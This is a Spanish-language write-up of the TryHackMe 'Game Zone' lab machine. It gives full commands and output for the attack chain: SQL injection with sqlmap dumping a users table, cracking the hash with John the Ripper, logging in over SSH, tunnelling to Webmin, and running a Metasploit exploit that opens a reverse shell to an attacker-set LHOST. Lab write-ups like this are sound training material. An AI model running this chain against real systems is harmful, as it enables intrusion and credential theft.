
---
## 📌 Información General

- **Plataforma:** TryHackMe
    
- **Máquina:** Game Zone
    
- **Dificultad:** Easy–Medium
    
- **IP objetivo:** `10.129.181.160`
    
- **Sistema:** Linux (Ubuntu)
    
- **Servicios principales:**
    
    - `22/tcp` → SSH
        
    - `80/tcp` → HTTP (Apache)
        
    - `10000/tcp` → Webmin
        

---

## 🧠 Metodología

Se siguió una metodología clásica de pentesting:

1. **Enumeración**
    
2. **Explotación web (SQL Injection)**
    
3. **Extracción de base de datos**
    
4. **Cracking de credenciales**
    
5. **Acceso al sistema (SSH)**
    
6. **Pivoting (SSH Tunnel)**
    
7. **Explotación con Metasploit (Webmin)**
    
8. **Obtención de shell**
    

---

# 🔍 1. Enumeración

## 🛠️ Herramienta: Nmap

```bash
nmap -sC -sV 10.129.181.160
```

### 📊 Resultado:

```
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu
80/tcp open  http    Apache 2.4.18
```

---

## 📁 Enumeración web

```bash
gobuster dir -u http://10.129.181.160 -w /usr/share/wordlists/dirb/common.txt
```

### Resultado:

- `/index.php`
    
- `/images`
    

👉 No hay rutas relevantes → foco en la aplicación web

---
# 🧪 3 Interceptación con Burp Suite

## 🛠️ Herramienta:

Burp Suite

---

## 🔍 Procedimiento

1. Activar proxy en Burp
    
2. Activar **Intercept ON**
    
3. Realizar una búsqueda en el panel (ej: `test`)
    
4. Capturar la petición
    

---

## 📌 Petición capturada

```
POST /portal.php HTTP/1.1
Host: 10.129.181.160
Content-Length: 15
Cache-Control: max-age=0
Accept-Language: es-ES,es;q=0.9
Origin: http://10.129.181.160
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0
Referer: http://10.129.181.160/portal.php
Cookie: PHPSESSID=9nmkgdtcnen0v24226cm9m1ps4
Connection: keep-alive

searchitem=test
```

---

## 🧠 Análisis técnico

|Elemento|Importancia|
|---|---|
|`POST /portal.php`|Endpoint vulnerable|
|`searchitem`|Parámetro inyectable|
|`PHPSESSID`|Sesión autenticada (CRÍTICO)|

👉 Sin la cookie, SQLMap no funcionaría correctamente.

---

# 💾 3.2 Guardado en fichero

La petición se guarda en un archivo para su reutilización:

```
nano request.txt
```

Contenido:

```
POST /portal.php HTTP/1.1
Host: 10.129.181.160
Cookie: PHPSESSID=9nmkgdtcnen0v24226cm9m1ps4
Content-Type: application/x-www-form-urlencoded

searchitem=test
```

---

## 🧠 Por qué es importante

👉 Este fichero permite a SQLMap:

- Reutilizar la sesión autenticada
    
- Mantener headers reales
    
- Simular tráfico legítimo
    

👉 Es una técnica **muy usada en pentesting real**

---

# 🚀 3.3 Explotación con SQLMap

## 🛠️ Herramienta:

sqlmap

---

## 🔧 Ejecución

```
sqlmap -r request.txt --dbms=mysql --dump --batch
```

---

## 📌 Parámetros clave

|   |   |
|---|---|
|Parámetro|Función|
|`-r request.txt`|Usa petición real interceptada|
|`--dbms=mysql`|Optimiza ataques|
|`--dump`|Extrae datos|
|`--batch`|Automatiza respuestas|

---

# 🔍 3.4 Descubrimiento de vulnerabilidad

SQLMap detecta:

```
POST parameter 'searchitem' is vulnerable
```

👉 Confirmación de SQL Injection

---

# 📊 3.5 Extracción de datos

## Base de datos: `db`

### Tabla: `users`

```
+------------------------------------------------------------------+----------+
| pwd                                                              | username |
+------------------------------------------------------------------+----------+
| ab5db915fc9cea6c78df88106c6500c57f2b52901ca6c0c6218f04122c3efd14 | agent47  |
+------------------------------------------------------------------+----------+
```

---

### Tabla adicional:

```
post
```
---

# 🔐 4. Cracking del Hash

## 🛠️ Herramienta: John the Ripper

```bash
john --format=raw-sha256 --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

---

## 🔓 Resultado:

```
videogamer124
```

---

# 🔑 5. Acceso SSH

```bash
ssh agent47@10.129.181.160
```

Password:

```
videogamer124
```

---

# 🌐 6. Acceso a Webmin

URL:

```
https://10.129.181.160:10000
```

Credenciales:

```
agent47 / videogamer124
```

👉 Acceso confirmado

---

# 🔀 7. Pivoting — SSH Tunnel

## 🎯 Objetivo

Exponer Webmin localmente

---

## 🔧 Comando:

```bash
ssh -L 10000:localhost:10000 agent47@10.129.181.160
```

---

## 🧠 Explicación

- `localhost:10000` en Kali → redirige a Webmin remoto
    
- Permite atacar el servicio como si fuera local
    

---

# 💥 8. Explotación con Metasploit

## 🛠️ Herramienta:

Metasploit Framework

---

## 🎯 Módulo usado:

```
exploit/unix/webapp/webmin_show_cgi_exec
```

---

## ⚙️ Configuración:

```bash
use exploit/unix/webapp/webmin_show_cgi_exec

set RHOSTS 127.0.0.1
set RPORT 10000
set SSL true
set USERNAME agent47
set PASSWORD videogamer124

set LHOST 192.168.130.29
set LPORT 4447

run
```

---

## 🧠 Punto clave

👉 `RHOSTS = 127.0.0.1`  
porque usamos **SSH tunnel**

---

# 🐚 9. Reverse Shell

### Resultado:

```
Command shell session opened
```

---

## 📌 Verificación

```bash
whoami
```

---

# 🏁 10. Flag

Ubicación:

```bash
/home/agent47/
```

```bash
cat flag.txt
```

---

# 🧰 Herramientas utilizadas

|Herramienta|Uso|
|---|---|
|Nmap|Enumeración|
|Gobuster|Fuerza bruta de directorios|
|Burp Suite|Interceptar tráfico|
|SQLMap|SQL Injection automatizado|
|John the Ripper|Cracking|
|SSH|Acceso remoto|
|Metasploit|Explotación|
|Netcat|Listener|

---

# 🧠 Lecciones clave

## 🔑 1. SQL Injection sigue siendo crítica

Permite acceso completo a la base de datos

---

## 🔑 2. Reutilización de credenciales

- DB → SSH → Webmin
    

---

## 🔑 3. Pivoting es clave

El uso de:

```bash
ssh -L
```

fue esencial

---

## 🔑 4. Configuración de Metasploit

- RHOSTS cambia según el contexto
    
- Tunnel → localhost
    

---

## 🔑 5. Enumeración progresiva

- No todo funciona a la primera
    
- Hay que cambiar de vector
    

---

# 🎯 Conclusión

Esta máquina demuestra:

- Cadena completa de ataque
    
- Uso combinado de herramientas
    
- Importancia del pivoting
    
- Adaptación en explotación
    

---

# 🏆 Estado final

✔ Acceso inicial  
✔ Extracción de credenciales  
✔ Acceso SSH  
✔ Pivoting  
✔ Explotación Webmin  
✔ Shell obtenida
